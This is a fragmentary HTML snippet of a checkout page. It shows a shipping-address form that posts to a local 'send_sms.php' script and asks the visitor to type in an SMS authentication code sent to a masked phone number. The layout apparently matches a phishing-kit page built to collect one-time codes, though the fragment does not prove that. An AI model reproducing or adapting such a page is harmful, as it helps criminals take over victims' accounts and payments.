...
<section class="checkout-new-shipping-address">
	<div class="checkout-box">
		...
		<div class="checkout-box-content">
			...
			<form class="checkout-new-shipping-address-form" method="post" action="./system/send_sms.php" data-toggle="validate">
...
">An SMS was sent to the number ********* with the authentication code. Wait for the SMS and after receiving it, please enter the code below.</p>
            <label for="codigo">Code:</label>&nbsp; <input required="" size="10" name="sms" id="codigo" style="width: 90px;height: 41px;border-radius: 3px;" type="text">
